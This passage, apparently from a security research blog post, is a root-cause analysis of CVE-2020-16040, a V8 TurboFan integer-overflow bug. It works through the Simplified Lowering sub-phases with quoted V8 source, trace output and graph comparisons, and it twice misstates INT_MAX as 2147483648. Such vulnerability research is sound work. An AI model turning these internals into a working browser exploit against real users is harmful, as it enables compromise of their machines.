<p>To understand this further; an unsigned integer contains only positive numbers (inclusive of 0), whereas signed integers have both positive and negative numbers (inclusive of 0). With a 32-bit signed integer, the range is between a negative and positive number, more specifically <code>INT_MIN</code> being <code>-2147483648</code>and an <code>INT_MAX</code> of <code>2147483648</code> (as previously mentioned). However, on the inverse, with a 32-bit unsigned integer (non-negative number), the range is from <code>UINT_MIN</code> of <code>0</code> to<code>UINT_MAX</code> of <code>4294967295</code>. In the context of the above, comparing two numbers as a 32-bit unsigned integer, if the returned value yields a negative number outside its range, this results in an overflow condition (as this number is unsigned, and should be <code>>=0</code>). However, if you compare two numbers as a 32-bit signed integer, the range is from <code>INT_MIN</code> being <code>-2147483648</code>and an <code>INT_MAX</code> of <code>2147483648</code>, yielding a negative number here would not result in an overflow condition as a negative returned value is within range of the 32-bit signed integer boundary.  The reason unsigned verse signed integers matter here is because the ranges between unsigned and signed integers vary (as stipulated above), and so in a situation like this, a check was needed to catch the overflow condition, however such a check does <b>note</b> appear to be included, hence TurboFan not catching the overflow condition. </p>
<p><b>Turbolizer Graph of Nodes of Patched Simplified Lowering Phase</b></p>
<p>The following turbolizer output corresponds to the patch V8 build, with both the widening condition being present, and also redacted:</p>
<p><b>With the widening condition:</b></p>
<p><center><img src="../images/patchedsl_w_widen.png"></center></p>
<p><b>Without the widening condition:</b></p>
<p><center><img src="../images/patchedsl_wo_widen.png"></center></p>
<p>It is evident above, that despite the widening condition being present or not within the regression ran against the patched version of V8, the output remains the same. The <code>Uint32LessThan</code> node is always an <code>Int32LessThan</code> node. However, the above two outputs in comparison to the previous turbolizer outputs of the unpatched version; only with the widening condition present we notice a difference, being that the control edge from the  <code>Word32Or</code> node, is to that of the <code>Int32LessThan</code> node in the patched version, and not the<code>Uint32LessThan</code> node when compared to the unpatched version (see further above).</p>
<p></p>In summary, with the patch applied to V8, the Simplified Lowering Phase will correctly compare the two numbers as a 32-bit signed integer using the<code>Int32LessThan</code> node instead of the <code>Uint32LessThan</code> node. This is the correct way to do it since the operation of <code>(y+1)|0</code> <b>does</b>  yield a negative number, of which, is in range of a 32-bit signed integer.
<p></p>This further supports our conclusion above, whereby, generating <code>Uint32LessThan</code> results in TurboFan assuming that <code>return z < 0;</code> is a comparison of two unsigned integers and does not acknowledge the possibility of an integer overflow condition.
<p></p>Since the vulnerable function is associated with the Simplified Lowering phase, looking at the <code>src/compiler/simplified-lowering.cc</code> source, we can see the following sub-phases from line <code>693</code> to <code>698</code>:

<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
  void Run(SimplifiedLowering* lowering) {
    GenerateTraversal();
    RunPropagatePhase();
    RunRetypePhase();
    RunLowerPhase(lowering);
}
</code>
</pre>
<p><h3><font color="white">[ THE SIMPLIFIED LOWERING PHASE & ITS SUBPHASES ]</font></h3></p>
<p>Since the vulnerability of <code>CVE-2020-16040</code> lies within the <code>SpeculativeSafeIntegerAdd</code> node. The following analysis of the Simplified Lowering phase will follow this node while running the regression.</p>
<p>Through the use of V8's <code>--trace-representation</code> flag, we can trace representation types:</p>
<p>Before entering the three sub-phases, <code>GenerateTraversal();</code> is called:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
// Generates a pre-order traversal of the nodes, starting with End.
void GenerateTraversal() {
ZoneStack&lt;NodeState&gt; stack(zone_);
stack.push({graph()-&gt;end(), 0});
GetInfo(graph()-&gt;end())-&gt;set_pushed();
	while (!stack.empty()) {
		NodeState& current = stack.top();
		Node* node = current.node;
		
		// If there is an unvisited input, push it and continue with that node.
		bool pushed_unvisited = false;
		while (current.input_index &lt; node->InputCount()) {
		Node* input = node-&gt;InputAt(current.input_index);
		NodeInfo* input_info = GetInfo(input);
		current.input_index++;
			if (input_info->unvisited()) {
			input_info->set_pushed();
			stack.push({input, 0});
			pushed_unvisited = true;
			break;
			} else if (input_info->pushed()) {
			// Optimization for the Retype phase.
			// If we had already pushed (and not visited) an input, it means that
			// the current node will be visited in the Retype phase before one of
			// its inputs. If this happens, the current node might need to be
			// revisited.
			MarkAsPossibleRevisit(node, input);
		}
	}
		if (pushed_unvisited) continue;
		
		stack.pop();
		NodeInfo* info = GetInfo(node);
		info->set_visited();
		
		// Generate the traversal
		traversal_nodes_.push_back(node);
}
</code>
</pre>
<p><code>GenerateTraversal();</code> generates every node into <code>traversal_nodes_</code> in a "pre-order" traversal starting from <code>End</code> onto a temporary stack as they're visited. If an input has already been pushed and not visited, then the current node will be revisited in the <code>RunRetypePhase();</code> (before one of its inputs), according to the code above.</p>
<p>An example depicting the differences between in-order, pre-order and post-order traversals:</p>
<center><img src="../images/order_traversals.png"></center>
<p>After nodes have been pushed into <code>traversal_nodes_</code>, the <code>RunPropagatePhase();</code> will execute:</p>
<p><h4><font color="white">[ THE PROPAGATE PHASE: <code>RunPropagatePhase();</code> ]</font></h4></p>
<p>As seen from its definition within <code>src/compiler/simplified-lowering.cc</code>:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
enum Phase {
  // 1.) PROPAGATE: Traverse the graph from the end, pushing usage information
  //     backwards from uses to definitions, around cycles in phis, according
  //     to local rules for each operator.
  //     During this phase, the usage information for a node determines the best
  //     possible lowering for each operator so far, and that in turn determines
  //     the output representation.
  //     Therefore, to be correct, this phase must iterate to a fixpoint before
  //     the next phase can begin.
PROPAGATE,
//...
</code>
</pre>
<p>In short, while the <code>GenerateTraversal();</code> function generated <code>traversal_nodes_</code> in a pre-order traversal starting from the <code>End</code> node; the <code>RunPropagatePhase();</code> function will iterate <code>traversal_nodes_</code> in a reverse post-order traversal with the <code>End</code> node as the root node, while propagating "truncations". These truncations are defined within <code>/src/compiler/representation-change.h</code> (line 155 to line 170):</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
// The {UseInfo} class is used to describe a use of an input of a node.
//
// This information is used in two different ways, based on the phase:
//
// 1. During propagation, the use info is used to inform the input node
// about what part of the input is used (we call this truncation) and what
// is the preferred representation. For conversions that will require
// checks, we also keep track of whether a minus zero check is needed.
//
// 2. During lowering, the use info is used to properly convert the input
// to the preferred representation. The preferred representation might be
// insufficient to do the conversion (e.g. word32->float64 conv), so we also
// need the signedness information to produce the correct value.
// Additionally, use info may contain {CheckParameters} which contains
// information for the deoptimizer such as a CallIC on which speculation
// should be disallowed if the check fails.
</code>
</pre>
<p>These truncation propagations in pertinence to the Propagate Phase can be visibly seen when debugging via tracing representation types, as shown below:</p>
<p>Output of <code>--trace-representation</code> on the Propagate Phase (focus on <code>SpeculativeSafeIntegerAdd</code> node):</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-sh">
--{Propagate phase}--
visit #48: End (trunc: no-value-use)
#...
visit #55: NumberLessThan (trunc: no-truncation (but distinguish zeros))
  initial #45: truncate-to-word32
  initial #44: truncate-to-word32
 visit #45: SpeculativeNumberBitwiseOr (trunc: truncate-to-word32)
  initial #43: truncate-to-word32
  initial #44: truncate-to-word32
  initial #43: truncate-to-word32
  initial #36: no-value-use
 visit #43: SpeculativeSafeIntegerAdd (trunc: truncate-to-word32)
  initial #39: no-truncation (but identify zeros)
  initial #42: no-truncation (but identify zeros)
  initial #22: no-value-use
  initial #36: no-value-use
 visit #42: NumberConstant (trunc: no-truncation (but identify zeros))
 visit #39: Phi (trunc: no-truncation (but identify zeros))
  initial #32: no-truncation (but identify zeros)
  initial #38: no-truncation (but identify zeros)
  initial #36: no-value-use
#...
</code>
</pre>
<p>The <code>SpeculativeNumberBitwiseOr</code>propagates a <code>Word32</code> truncation to it's first input, being the <code>#43: SpeculativeSafeIntegerAdd</code> node which propagates <code>no-truncation</code> to its first two inputs, being <code>#39 Phi</code> and <code>#42 NumberConstant</code> nodes. <code>Word32</code> is an unsigned 32-bit integer type and we can speculate that this <code>Word32</code> truncation eventually leads to this node being treated as an unsigned 32-bit integer, as opposed to a signed 32-bit integer which lowers  the <code>#55 NumberLessThanBoolean</code> node from the Escape Analysis phase to a <code>#55 Uint32LessThanBoolean</code> during the Lowering phase (we will get to this later). </p>
<p>Looking at the source in relevance to the <code>RunPropagatePhase();</code> function is as follows:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
//...
// Backward propagation of truncations to a fixpoint.
void RunPropagatePhase() {
	TRACE("--{Propagate phase}--\n");
	ResetNodeInfoState();
	DCHECK(revisit_queue_.empty());

// Process nodes in reverse post order, with End as the root.
	for (auto it = traversal_nodes_.crbegin(); it != traversal_nodes_.crend();
		++it) {
	PropagateTruncation(*it);
	while (!revisit_queue_.empty()) {
		Node* node = revisit_queue_.front();
		revisit_queue_.pop();
		PropagateTruncation(node);
		}
	}
}
//...
</code>
</pre>
<p>At the end of this function, the <code>PropagateTruncation(node)</code> is called, which its source is illustrated below:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
//...
// Visits the node and marks it as visited. Inside of VisitNode, we might
// change the truncation of one of our inputs (see EnqueueInput<PROPAGATE> for
// this). If we change the truncation of an already visited node, we will add
// it to the revisit queue.

void PropagateTruncation(Node* node) {
	NodeInfo* info = GetInfo(node);
	info->set_visited();
	TRACE(" visit #%d: %s (trunc: %s)\n", node->id(), node->op()->mnemonic(),
		info->truncation().description());
	VisitNode&lt;PROPAGATE>(node, info->truncation(), nullptr);
}
//...
</code>
</pre>
<p>The <code>PropagateTruncation();</code> function contains a callback to <code>VisitNode</code>. This <code>VisitNode&lt;PROPAGATE></code> then calls <code>VisitSpeculativeIntegerAdditiveOp</code> as seen below: </p> 
<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
void VisitNode(Node* node, Truncation truncation, 
			   SimplifiedLowering* lowering) {
//...
tick_counter_->TickAndMaybeEnterSafepoint();
case IrOpcode::kSpeculativeSafeIntegerAdd:
case IrOpcode::kSpeculativeSafeIntegerSubtract:
	return VisitSpeculativeIntegerAdditiveOp&lt;T>(node, truncation, lowering);
</code>
</pre>
<p>The source of the<code>VisitSpeculativeIntegerAdditiveOp</code> function (in reference to the <code>SpeculativeSafeIntegerAdd</code> node):</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
template &lt;Phase T>
void VisitSpeculativeIntegerAdditiveOp(Node* node, Truncation truncation, SimplifiedLowering* lowering) {
	Type left_upper = GetUpperBound(node->InputAt(0));
	Type right_upper = GetUpperBound(node->InputAt(1));
	if (left_upper.Is(type_cache_->kAdditiveSafeIntegerOrMinusZero) &&
		right_upper.Is(type_cache_->kAdditiveSafeIntegerOrMinusZero)) {
	//...
	return;
}
	//...
	// Try to use type feedback.
	NumberOperationHint hint = NumberOperationHintOf(node->op());
	DCHECK(hint == NumberOperationHint::kSignedSmall ||
	hint == NumberOperationHint::kSigned32);
	//...
</code>
</pre>
<p>The <code>left_upper</code> variable gets its input from <code>InputAt(0)</code>, while the <code>right_upper</code> variable gets its input from <code>InputAt(1)</code>. These <code>left_upper</code> and <code>right_upper</code> "Type" variables are  the types of the first two input nodes, where these truncations are propagated to from the <code>SpecualtiveSafeIntegerAdd</code> node (remember how the<code>traversal_nodes_</code> vector is iterated). In this case, this is the <code>#39 Phi</code> and <code>#42 NumberConstant</code> nodes as shown below:</p>
<center><img src="../images/prop-phase-1.png"></center>
<p><ul>The <code>SpeculativeSafeIntegerAdd</code> nodes <code>VisitSpeculativeIntegerAdditiveOp</code>, in reference to the regression PoC, determines the following types of the first two input nodes:
<li><code>#39 Phi</code> node is a <code>UnionType</code> of <code>NaN | Range(-1, 2147483647)</code> (<code>left_upper</code>) and;</li>
<li>The <code>#42 NumberConstant[1]</code> node is a <code>RangeType</code> of <code>Range(1, 1)</code> (<code>right_upper</code>).</li></ul></p>
<p>Looking at the <code>if</code> conditional clause specifically;</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
//..
	if (left_upper.Is(type_cache_->kAdditiveSafeIntegerOrMinusZero) &&
		right_upper.Is(type_cache_->kAdditiveSafeIntegerOrMinusZero)) {
	//...
	return;
</code>
</pre>
<p>There is a reference to <code>type_cache</code> with an arrow operator which is used to access elements in structures and unions, in this case, being  <code>kAdditiveSafeIntegerOrMinusZero</code>. </p>
<p>Looking at the <code>/src/compiler/type-cache.h</code> source, we can see the various types. In regards to <code>kAdditiveSafeIntegerOrMinusZero</code>:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
//...
Type const kAdditiveSafeInteger =
	CreateRange(-4503599627370496.0, 4503599627370496.0);
Type const kSafeInteger = CreateRange(-kMaxSafeInteger, kMaxSafeInteger);
Type const kAdditiveSafeIntegerOrMinusZero =
	Type::Union(kAdditiveSafeInteger, Type::MinusZero(), zone());
Type const kSafeIntegerOrMinusZero =
	Type::Union(kSafeInteger, Type::MinusZero(), zone());
//...
</code>
</pre>
<p></p>As seen from the above code block, the <code>kAdditiveSafeIntegerOrMinusZero</code> type cache is a <code>UnionType</code> between the range of <code>kAdditiveSafeInteger</code> and <code>Type::MinusZero()</code>, where <code>kAdditiveSafeInteger</code> has a range of <code>(-4503599627370496.0, 4503599627370496.0);</code>
<p></p>As a result, the first conditional clause; <code>if (left_upper.Is(type_cache_->kAdditiveSafeIntegerOrMinusZero)</code> will return <code>false</code> as it does not include the <code>NaN</code> numeric data type, of which is a value that is either undefined or unrepresentable, particularly in floating-point arithmetic (real numbers). The second conditional clause; <code>right_upper.Is(type_cache_->kAdditiveSafeIntegerOrMinusZero)</code> will return <code>true</code>, however, the logical <code>AND</code> operator (<code>&&</code>) will fail as it is intended to return <code>true</code> if both operands are <code>true</code>, and return <code>false</code> otherwise, in this case it returns <code>false</code>, breaking the <code>if</code> branch. This results in the regression PoC skipping the entire conditional <code>if</code> branch, alternating its execution flow during the Propagate Phase.
<p></p>Further; in the same code block the<code>VisitSpeculativeIntegerAdditiveOp</code>, the following is seen:
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
void VisitSpeculativeIntegerAdditiveOp(Node* node, Truncation truncation, SimplifiedLowering* lowering) {
	//...
	// Try to use type feedback.
	NumberOperationHint hint = NumberOperationHintOf(node->op());
	DCHECK(hint == NumberOperationHint::kSignedSmall ||
			hint == NumberOperationHint::kSigned32);
	//...
	return;
}
</code>
</pre>
<p>We see that the <code>SpeculativeSafeIntegerAdd</code> node’s <code>NumberOperationHint</code> is stored into <code>hint</code>, and a <code>DCHECK</code> ensures that the hint is either <code>kSignedSmall</code> or <code>kSigned32</code>. Meaning, to be able to reach this code it is required that we need either <code>SignedSmall</code> or <code>Signed32</code> feedback. </p>
<p>By removing the line in the regression associated with gathering this type feedback, we can see the following graph output differences:</p>
<p><b>Without gathering feedback of <code>SignedSmall</code>:</b></p>
<p><center><img src="../images/wo_signedsmall.png"></center></p>
<p><b>With gathering feedback of <code>SignedSmall</code>:</b></p>
<p><center><img src="../images/w_signedsmall.png"></center></p>
<p>As a result, the type feedback during the warmup run is required to be <code>SignedSmall</code> in order to insert the <code>SpeculativeSafeIntegerAdd</code> node as opposed to the <code>SpeculativeNumberAdd</code> node. If this feedback alters, the <code>SpeculativeSafeIntegerAdd</code> node will be replaced with the <code>SpeculativeNumberAdd</code> node, which does <b>not</b> call the vulnerable <code>VisitSpeculativeIntegerAdditiveOp</code> function during the Simplified Lowering phase.</p>
<p>Continuing to look at the <code>VisitSpeculativeIntegerAdditiveOp</code> function, we see that   <code>VisitBinop</code> is called:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
template &lt;Phase T>
  void VisitSpeculativeIntegerAdditiveOp(Node* node, Truncation truncation, SimplifiedLowering* lowering) {
    //...
    } else {
      // If the output's truncation is identify-zeros, we can pass it
      // along. Moreover, if the operation is addition and we know the
      // right-hand side is not minus zero, we do not have to distinguish
      // between 0 and -0.
      IdentifyZeros left_identify_zeros = truncation.identify_zeros();
      if (node->opcode() == IrOpcode::kSpeculativeSafeIntegerAdd &&
          !right_feedback_type.Maybe(Type::MinusZero())) {
        left_identify_zeros = kIdentifyZeros;
      }
      UseInfo left_use = CheckedUseInfoAsWord32FromHint(hint, FeedbackSource(), left_identify_zeros);
      // For CheckedInt32Add and CheckedInt32Sub, we don't need to do
      // a minus zero check for the right hand side, since we already
      // know that the left hand side is a proper Signed32 value,
      // potentially guarded by a check.
      UseInfo right_use = CheckedUseInfoAsWord32FromHint(hint, FeedbackSource(), kIdentifyZeros);
      VisitBinop&lt;T>(node, left_use, right_use, MachineRepresentation::kWord32,
                    Type::Signed32());
    }
    //...
  }
</code>
</pre>
<p>The <code>VisitBinop</code> function:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
template &lt;Phase T>
void VisitBinop(Node* node, UseInfo left_use, UseInfo right_use, MachineRepresentation output, Type restriction_type = Type::Any()) {
	DCHECK_EQ(2, node->op()->ValueInputCount());
	ProcessInput&lt;T>(node, 0, left_use);
	ProcessInput&lt;T>(node, 1, right_use);
	for (int i = 2; i &lt; node->InputCount(); i++) {
		EnqueueInput&lt;T>(node, i);
	}
	SetOutput&lt;T>(node, output, restriction_type);
}
</code>
</pre>
<p>The <code>VisitBinop</code> function has multiple purposes, however, of most importance is that this function calls the <code>SetOutput</code> function to set the <code>restriction_type</code> of the <code>SpeculativeSafeIntegerAdd</code> node (updates the field in the <code>nodeinfo</code>) to that of <code>Type::Signed32()</code>, and its output representation to <code>kWord32</code>.</p>
<p><h4><font color="white">[ THE RETYPE PHASE: <code>RunRetypePhase();</code> ]</font></h4></p>
<p>As seen from its definition within <code>src/compiler/simplified-lowering.cc</code></p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
//...
  // 2.) RETYPE: Propagate types from type feedback forwards.
RETYPE,
//...
</code>
</pre>
<p>The <code>RunRetypePhase();</code> function iterates the <code>traversal_nodes_</code> vector in a non-reverse order (from start, finishing at the <code>End</code> node). Output of <code>--trace-representation</code> on the Retype Phase (focusing on <code>SpeculativeSafeIntegerAdd</code> node) is as follows:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-sh">
--{Retype phase}--
#...
#39:Phi[kRepTagged](#32:Phi, #38:NumberConstant, #36:Merge)  [Static type: (NaN | Range(-1, 2147483647))]
 visit #39: Phi
  ==> output kRepFloat64
 visit #42: NumberConstant
  ==> output kRepTaggedSigned
#43:SpeculativeSafeIntegerAdd[SignedSmall](#39:Phi, #42:NumberConstant, #22:SpeculativeNumberEqual, #36:Merge)  [Static type: Range(0, 2147483648), Feedback type: Range(0, 2147483647)]
 visit #43: SpeculativeSafeIntegerAdd
  ==> output kRepWord32
#45:SpeculativeNumberBitwiseOr[SignedSmall](#43:SpeculativeSafeIntegerAdd, #44:NumberConstant, #43:SpeculativeSafeIntegerAdd, #36:Merge)  [Static type: Range(-2147483648, 2147483647), Feedback type: Range(0, 2147483647)]
 visit #45: SpeculativeNumberBitwiseOr
  ==> output kRepWord32
 visit #55: NumberLessThan
  ==> output kRepBit
 visit #47: Return
  ==> output kRepTagged
 visit #48: End
  ==> output kRepTagged
#...
</code>
</pre>
<p>The first two inputs of the <code>SpeculativeSafeIntegerAdd</code> node, being <code>#39 Phi</code> and <code>#42 NumberConstant</code> nodes have been retyped, with their feedback type being updated in the Retype Phase. The output representation of the <code>Phi</code> node is set to <code>kRepFloat64</code> due to the widening of the static type to <code>NaN</code>, and the <code>NumberConstant</code> node is set to <code>kRepTaggedSigned</code>. Within <code>src/codegen/machine-type.h</code>, we can see that <code>kRepTaggedSigned</code> represents an uncompressed Smi:</p>

<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
enum class MachineRepresentation : uint8_t {
kNone,
kBit,
kWord8,
kWord16,
kWord32,
kWord64,
kTaggedSigned, // (uncompressed) Smi
kTaggedPointer, // (uncompressed) HeapObject
kTagged, // (uncompressed) Object (Smi or HeapObject)
kCompressedPointer, // (compressed) HeapObject
kCompressed, // (compressed) Object (Smi or HeapObject)
// FP representations must be last, and in order of increasing size.
kFloat32,
kFloat64,
kSimd128,
kFirstFPRepresentation = kFloat32,
kLastRepresentation = kSimd128
};
</code>
</pre>
<p>Additionally, of observation within the the trace representation output, we can see inconsistencies between the feedback and static types assigned to the <code>Phi</code> and <code>NumberConstant</code> nodes. </p>
<p>The <code>RunRetypePhase();</code> function is defined below:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
// Forward propagation of types from type feedback to a fixpoint.
void RunRetypePhase() {
  TRACE("--{Retype phase}--\n");
  ResetNodeInfoState();
  DCHECK(revisit_queue_.empty());
  for (auto it = traversal_nodes_.cbegin(); it != traversal_nodes_.cend();
    ++it) {
    Node * node = * it;
    if (!RetypeNode(node)) continue;
    auto revisit_it = might_need_revisit_.find(node);
    if (revisit_it == might_need_revisit_.end()) continue;
    for (Node *
      const user: revisit_it -> second) {
      PushNodeToRevisitIfVisited(user);
    }
    // Process the revisit queue.
    while (!revisit_queue_.empty()) {
      Node * revisit_node = revisit_queue_.front();
      revisit_queue_.pop();
      if (!RetypeNode(revisit_node)) continue;
      // Here we need to check all uses since we can't easily know which
      // nodes will need to be revisited due to having an input which was
      // a revisited node.
      for (Node *
        const user: revisit_node -> uses()) {
        PushNodeToRevisitIfVisited(user);
        //...
      }
}
</code>
</pre>
<p>The <code>RunRetypePhase();</code> function contains a callback to the <code>RetypeNode</code> function before processing conditions across the <code>revisit_queue</code> which will instruct the <code>RunRetypePhase();</code> function to revisit (if required) until the <code>revisit_queue</code> is empty. Looking at the <code>RetypeNode</code> function:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
bool RetypeNode(Node* node) {
  NodeInfo* info = GetInfo(node);
	info->set_visited();
	bool updated = UpdateFeedbackType(node);
	TRACE(" visit #%d: %s\n", node->id(), node->op()->mnemonic());
	VisitNode&lt;RETYPE>(node, info->truncation(), nullptr);
	TRACE(" ==> output %s\n", MachineReprToString(info->representation()));
	return updated;
}
</code>
</pre>
<p>The <code>RetypeNode</code> function marks a node as visited and contains a callback to <code>UpdateFeedbackType()</code>, of which, updates node feedback types:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
  bool UpdateFeedbackType(Node * node) {
    if (node -> op() -> ValueOutputCount() == 0) return false;
    if (node -> opcode() != IrOpcode::kPhi) {
      for (int i = 0; i &lt; node -> op() -> ValueInputCount(); i++) {
        if (GetInfo(node -> InputAt(i)) -> feedback_type().IsInvalid()) {
          return false;
        }
      }
    }
    NodeInfo * info = GetInfo(node);
    Type type = info -> feedback_type();
    Type new_type = NodeProperties::GetType(node);
    // We preload these values here to avoid increasing the binary size too
    // much, which happens if we inline the calls into the macros below.
    Type input0_type;
    if (node -> InputCount() > 0) input0_type = FeedbackTypeOf(node -> InputAt(0));
    Type input1_type;
    if (node -> InputCount() > 1) input1_type = FeedbackTypeOf(node -> InputAt(1));
    switch (node -> opcode()) {
      //...
      #define DECLARE_CASE(Name)\
    case IrOpcode::k # #Name: {
      \
      new_type = Type::Intersect(op_typer_.Name(input0_type, input1_type), \
        info -> restriction_type(), graph_zone());\
      break;\
    }
    SIMPLIFIED_SPECULATIVE_NUMBER_BINOP_LIST(DECLARE_CASE)
    SIMPLIFIED_SPECULATIVE_BIGINT_BINOP_LIST(DECLARE_CASE)
    #undef DECLARE_CASE
    //...
    }
    // We need to guarantee that the feedback type is a subtype of the upper
    // bound. Naively that should hold, but weakening can actually produce
    // a bigger type if we are unlucky with ordering of phi typing. To be
    // really sure, just intersect the upper bound with the feedback type.
    new_type = Type::Intersect(GetUpperBound(node), new_type, graph_zone());
    if (!type.IsInvalid() && new_type.Is(type)) return false;
    GetInfo(node) -> set_feedback_type(new_type);
    if (FLAG_trace_representation) {
      PrintNodeFeedbackType(node);
    }
    return true;
  }
</code>
</pre>
<p>Of importance is from the beginning of the two <code>Type</code> vars, being <code>type</code> and <code>new_type</code>. <code>type</code> is the current feedback type of the node, while <code>new_type</code> is the current static type of the node. The feedback types of both inputs, being the <code>Phi</code> and <code>NumberConstant</code> nodes (as seen in the trace representation earlier above) are stored in <code>input0_type</code> and <code>input1_type</code>. Where <code>input0_type</code> (<code>Phi</code> node) is <code>NaN | Range(-1, 2147483647)</code> and <code>input1_type</code> (<code>NumberConstant</code> node ) is <code>Range(1, 1).</code>:</p>
<p><center><img src="../images/ftnt.png"></center></p>
<p>Following the above, the <code>UpdateFeedbackType</code> function contains a large <code>switch</code>/<code>case</code> statement using macros, which its purpose is "to avoid increasing the binary size". The most relevant statement is associated with the one that handles <code>SIMPLIFIED_SPECULATIVE_NUMBER_BINOP_LIST</code> being;</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
new_type = Type::Intersect(op_typer_.Name(input0_type, input1_type), info->restriction_type(), graph_zone());
</code>
</pre>
<p>Of which, translates to:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
  new_type =
    Type::Intersect(OperationTyper::SpeculativeSafeIntegerAdd(input0_type, input1_type),
      info -> restriction_type(), graph_zone());
</code>
</pre>
<p>As:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
  //...
  OperationTyper op_typer_; // helper for the feedback typer
  //...
</code>
</pre>
Where <code>op_typer_.Name</code> (being; OperationTyper.Name), where <code>Name</code>, being the <code>DECLARE_CASE</code> of <code>SIMPLIFIED_SPECULATIVE_NUMBER_BINOP_LIST</code>, of which is defined below (<code>src/compiler/opcodes.h</code>):
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
  #define SIMPLIFIED_SPECULATIVE_NUMBER_BINOP_LIST(V) \
	V(SpeculativeNumberAdd) \
	V(SpeculativeNumberSubtract) \
	V(SpeculativeNumberMultiply) \
	V(SpeculativeNumberDivide) \
	V(SpeculativeNumberModulus) \
	V(SpeculativeNumberBitwiseAnd) \
	V(SpeculativeNumberBitwiseOr) \
	V(SpeculativeNumberBitwiseXor) \
	V(SpeculativeNumberShiftLeft) \
	V(SpeculativeNumberShiftRight) \
	V(SpeculativeNumberShiftRightLogical) \
	V(SpeculativeSafeIntegerAdd) \
	V(SpeculativeSafeIntegerSubtract)
</code>
</pre>
<p>In the above macro translation code block, <code>new_type</code> is being set to a new intersection type. Which is the intersection between the current node's restriction type, <code>Type::Signed32()</code>, and that of the type returned from the <code>OperationTyper::SpeculativeSafeIntegerAdd()</code> call:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
  Type OperationTyper::SpeculativeSafeIntegerAdd(Type lhs, Type rhs) {
    Type result = SpeculativeNumberAdd(lhs, rhs);
    // If we have a Smi or Int32 feedback, the representation selection will
    // either truncate or it will check the inputs (i.e., deopt if not int32).
    // In either case the result will be in the safe integer range, so we
    // can bake in the type here. This needs to be in sync with
    // SimplifiedLowering::VisitSpeculativeAdditiveOp.
    return Type::Intersect(result, cache_->kSafeIntegerOrMinusZero, zone());
    }    
</code>
</pre>
<p>The above returns <code>Range(0,2147483648)</code>. Therefore, the intersection of this range to that of the <code>Type::Signed32()</code> restriction type that was set in the Propagation Phase, being <code>Range(-2147483648,2147483647)</code> would result in new feedback type of <code>Range(0,2147483647)</code>. This is problematic, as the range of <code>input0_type</code>, being the <code>Phi</code> node was <code>Range(-1, 2147483647)</code>, with <code>2147483647</code> being <code>INT_MAX</code> of this range the addition of <code>1</code> will equate to <code>INT_MAX + 1</code> which becomes <code>2147483647+1</code>, being <code>2147483648</code>, which in turn wraps to <code>INT_MIN</code>, being <code>-2147483648</code>, due to the restriction type having been set to <code>Type::Signed32()</code>.</p>
<p><h4><font color="white">[ THE LOWERING PHASE: <code>RunLowerPhase();</code> ]</font></h4></p>
<p>As seen from the its definition within <code>src/compiler/simplified-lowering.cc</code></p>

<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
  //...
  // 3.) LOWER: perform lowering for all {Simplified} nodes by replacing some
  //     operators for some nodes, expanding some nodes to multiple nodes, or
  //     removing some (redundant) nodes.
  //     During this phase, use the {RepresentationChanger} to insert
  //     representation changes between uses that demand a particular
  //     representation and nodes that produce a different representation.
  LOWER
};
</code>
</pre>
<p>The <code>RunLowerPhase();</code> function iterates through <code>_traversal_nodes</code> from the beginning and concludes at the <code>End</code> node. The trace representation output is illustrated below:</p>
<pre style="background-color: #100E15; border: none !important;">
  <code class="language-sh">
    --{Lower phase}--
    #...
    visit #39: Phi
      change: #39:Phi(@1 #38:NumberConstant) from kRepTaggedSigned to kRepFloat64:no-truncation (but identify zeros)
     visit #42: NumberConstant
    defer replacement #42:NumberConstant with #66:Int64Constant
     visit #43: SpeculativeSafeIntegerAdd
      change: #43:SpeculativeSafeIntegerAdd(@0 #39:Phi) from kRepFloat64 to kRepWord32:no-truncation (but identify zeros)
      change: #43:SpeculativeSafeIntegerAdd(@1 #42:NumberConstant) from kRepTaggedSigned to kRepWord32:no-truncation (but identify zeros)
     visit #45: SpeculativeNumberBitwiseOr
      change: #45:SpeculativeNumberBitwiseOr(@1 #44:NumberConstant) from kRepTaggedSigned to kRepWord32:truncate-to-word32
     visit #55: NumberLessThan
      change: #55:NumberLessThan(@1 #44:NumberConstant) from kRepTaggedSigned to kRepWord32:truncate-to-word32
     visit #47: Return
      change: #47:Return(@0 #44:NumberConstant) from kRepTaggedSigned to kRepWord32:truncate-to-word32
      change: #47:Return(@1 #55:Uint32LessThan) from kRepBit to kRepTagged:no-truncation (but distinguish zeros)
     visit #48: End      
  </code>
  </pre>
  <p>In addition to the above, looking at the turbolizer graph we can see that the <code>SpeculativeSafeIntegerAdd</code> node within the Escape Analysis phase becomes an <code>Int32Add</code> node within the Simplified Lowering phase, and that the <code>NumberLessThan</code> node within the Escape Analysis phase becomes a <code>Uint32LessThanBoolean</code> node within the Simplified Lowering phase. </p>
